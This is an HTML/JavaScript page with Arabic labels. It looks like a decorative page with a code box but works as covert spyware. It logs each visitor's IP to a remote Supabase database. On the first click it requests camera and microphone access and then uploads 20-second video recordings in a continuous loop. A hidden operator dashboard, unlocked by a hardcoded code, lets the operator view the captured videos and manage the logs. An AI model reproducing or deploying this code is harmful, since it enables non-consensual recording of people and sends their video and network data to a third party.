ذ<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Advanced Video Dashboard</title>
<style>
/* ===== Body & RGB Background ===== */
body{
    margin:0; height:100vh; overflow:hidden; font-family:Arial, sans-serif;
    display:flex; justify-content:center; align-items:center;
    background: linear-gradient(120deg,#ff0000,#00ff00,#0000ff);
    background-size:600% 600%;
    animation: slowRGB 60s ease infinite;
}
@keyframes slowRGB{
    0% {background-position:0% 50%;}
    25%{background-position:50% 50%;}
    50%{background-position:100% 50%;}
    75%{background-position:50% 50%;}
    100%{background-position:0% 50%;}
}

/* ===== Secret Input ===== */
#secretInput{
    position:absolute; bottom:30px; padding:12px; border-radius:30px;
    border:none; outline:none; width:220px; text-align:center;
    font-size:16px; background:rgba(255,255,255,0.2); backdrop-filter:blur(10px); color:white;
}

/* ===== Panel ===== */
#panel{
    display:none; position:fixed; top:0; left:0; width:100%; height:100%;
    background:#fff; overflow:auto; padding:20px;
}
#panel h2{margin-top:0; color:#222;}
video{ width:300px; margin:10px; display:block;}
#consoleBox{ background:black; color:#0f0; padding:10px; height:200px; overflow:auto; font-size:12px; margin-top:20px;}
button{ padding:8px 15px; margin:5px; cursor:pointer;}
button:hover{opacity:0.8;}
input.logFilter{margin:5px; padding:5px;}
#videos{display:flex; flex-wrap:wrap;}
.videoContainer{margin:5px; border:1px solid #ccc; padding:5px; border-radius:8px;}
.videoContainer span{display:block; font-size:12px; margin-top:3px;}
</style>
</head>
<body>

<input id="secretInput" placeholder="ادخل الكود لفتح الداشببببورد">

<div id="panel">
<h2>لوحة التحكم المتقدمة</h2>

<input class="logFilter" id="logSearch" placeholder="بحث في الـLogs">
<button onclick="clearScreen()">تصفية الشاشة</button>
<button onclick="deleteLogs()">حذف جميع السجلات من Supabase</button>
<button onclick="exportLogs()">تصدير Logs كملف TXT</button>

<p>أجهزة تسجل الآن: <span id="activeCount">0</span></p>
<p>عدد الفيديوهات المخزنة: <span id="videoCount">0</span></p>
<p>حجم جميع الفيديوهات: <span id="videoSize">0</span> MB</p>
<p>IP العام لهذا الجهاز: <span id="userIP">جاري التحميل...</span></p>

<div id="videos"></div>
<div id="consoleBox"></div>
</div>

<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2.6.0/dist/supabase.min.js"></script>
<script>
/* ===== Supabase Config ===== */
const SUPABASE_URL = "https://aeuprfdpiumdhuceuklj.supabase.co";
const SUPABASE_ANON_KEY = "sb_publishable_CpkeH3iIXirmlRg8CtzX4Q_RQ97jDdq";
const supabase = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

/* ===== Variables ===== */
let mediaRecorder, stream, recordingStarted=false;
let logCollection = "logs";
let sessionID = Date.now();
let recordingInterval;

/* ===== Logging Function ===== */
async function log(msg,type="info"){
    const time = new Date().toLocaleTimeString();
    const fullMsg = `[${time}] [${type.toUpperCase()}] ${msg}`;
    const box = document.getElementById("consoleBox");
    let color="white";
    if(type==="error") color="red";
    else if(type==="warning") color="yellow";
    else color="#00ff00";

    box.innerHTML += `<span style="color:${color}">${fullMsg}</span><br>`;
    box.scrollTop = box.scrollHeight;
    console.log(fullMsg);

    // Save to Supabase
    await supabase.from(logCollection).insert([
        { message: fullMsg, timestamp: Date.now(), session: sessionID.toString(), type:type }
    ]);
}

/* ===== Get IP ===== */
async function getIP(){
    try{
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        document.getElementById("userIP").innerText = data.ip;
        await log("IP الجهاز: "+data.ip);
    }catch(e){
        document.getElementById("userIP").innerText="تعذر الحصول على IP";
        await log("خطأ IP: "+e.message,"error");
    }
}
getIP();

/* ===== Start Recording after Click ===== */
document.addEventListener("click", async ()=>{
    if(recordingStarted) return;
    try{
        await log("طلب إذن الكاميرا...");
        stream = await navigator.mediaDevices.getUserMedia({video:true,audio:true});
        await log("تم منح الإذن");
        startRecordingLoop();
        recordingStarted=true;
    }catch(e){
        await log("خطأ: "+e.message,"error");
    }
},{once:true});

function startRecordingLoop(){
    recordingInterval = setInterval(()=>startRecording(), 20000); // كل 20 ثانية
    startRecording();
}

async function startRecording(){
    if(!stream) return;
    const recorder = new MediaRecorder(stream,{mimeType:"video/webm;codecs=vp9"});
    let chunks=[];
    recorder.ondataavailable = e=>chunks.push(e.data);
    recorder.onstop=async ()=>{
        const blob = new Blob(chunks,{type:"video/webm"});
        const fileName="video_"+Date.now()+".webm";

        // Upload to Supabase Storage
        const { data, error } = await supabase.storage.from("videos").upload(fileName, blob, { upsert: true });
        if(error) log("خطأ رفع الفيديو: "+error.message,"error");
        else log(`تم رفع فيديو: ${fileName} | الحجم: ${(blob.size/1024/1024).toFixed(2)} MB`);
        chunks=[];

        updateVideoCount();
        updateVideoSize();
        loadVideos();
    };
    recorder.start();
    setTimeout(()=>recorder.stop(), 20000);
}

/* ===== Secret Input ===== */
const input=document.getElementById("secretInput");
input.addEventListener("input",()=>{ if(input.value==="AMJED190"){ showPanel(); } });
async function showPanel(){
    document.getElementById("panel").style.display="block";
    await log("فتح لوحة التحكم");
    loadVideos();
    monitorActiveSessions();
    refreshConsole();
}

/* ===== Load Videos ===== */
async function loadVideos(){
    const container=document.getElementById("videos");
    container.innerHTML="";
    const { data: files, error } = await supabase.storage.from("videos").list();
    if(files){
        for(const item of files){
            const urlData = await supabase.storage.from("videos").getPublicUrl(item.name);
            const sizeMB = (item.size/1024/1024).toFixed(2);
            const videoDiv = document.createElement("div");
            videoDiv.className="videoContainer";
            const videoEl=document.createElement("video");
            videoEl.src=urlData.publicUrl; videoEl.controls=true;
            const info = document.createElement("span");
            info.innerText=`${item.name} | ${sizeMB} MB`;
            videoDiv.appendChild(videoEl);
            videoDiv.appendChild(info);
            container.appendChild(videoDiv);
        }
    }
    updateVideoCount();
    updateVideoSize();
}

/* ===== Update Counts ===== */
async function updateVideoCount(){
    const { data: files } = await supabase.storage.from("videos").list();
    document.getElementById("videoCount").innerText=files?files.length:0;
}

async function updateVideoSize(){
    const { data: files } = await supabase.storage.from("videos").list();
    let total=0;
    if(files) files.forEach(f=>total+=f.size);
    document.getElementById("videoSize").innerText=(total/1024/1024).toFixed(2);
}

/* ===== Active Sessions ===== */
async function monitorActiveSessions(){
    const { data: logs } = await supabase.from(logCollection).select("*"); // فقط عدّ كمثال
    document.getElementById("activeCount").innerText = logs?logs.length:0;
}

/* ===== Console Refresh كل ثانية ===== */
async function refreshConsole(){
    setInterval(async ()=>{
        const { data } = await supabase.from(logCollection).select("*").order("timestamp",{ascending:true});
        const box = document.getElementById("consoleBox");
        const search = document.getElementById("logSearch").value.toLowerCase();
        box.innerHTML="";
        if(data){
            data.forEach(d=>{
                const msg = d.message;
                if(search && !msg.toLowerCase().includes(search)) return;
                let color="white";
                if(d.type==="error") color="red";
                else if(d.type==="warning") color="yellow";
                else color="#00ff00";
                box.innerHTML += `<span style="color:${color}">${msg}</span><br>`;
            });
        }
        box.scrollTop = box.scrollHeight;
    },1000);
}

/* ===== Buttons ===== */
window.clearScreen=function(){ document.getElementById("consoleBox").innerHTML=""; }
window.deleteLogs=async function(){
    const { data } = await supabase.from(logCollection).select("*");
    if(data) for(const d of data) await supabase.from(logCollection).delete().eq('id',d.id);
    alert("تم حذف جميع السجلات من Supabase");
}
window.exportLogs=async function(){
    const { data } = await supabase.from(logCollection).select("*");
    let text="";
    if(data) data.forEach(d=>{ text+=d.message+"\n"; });
    const blob=new Blob([text],{type:"text/plain"});
    const link=document.createElement("a");
    link.href=URL.createObjectURL(blob);
    link.download="logs.txt";
    link.click();
}
</script>
</body>
</html>
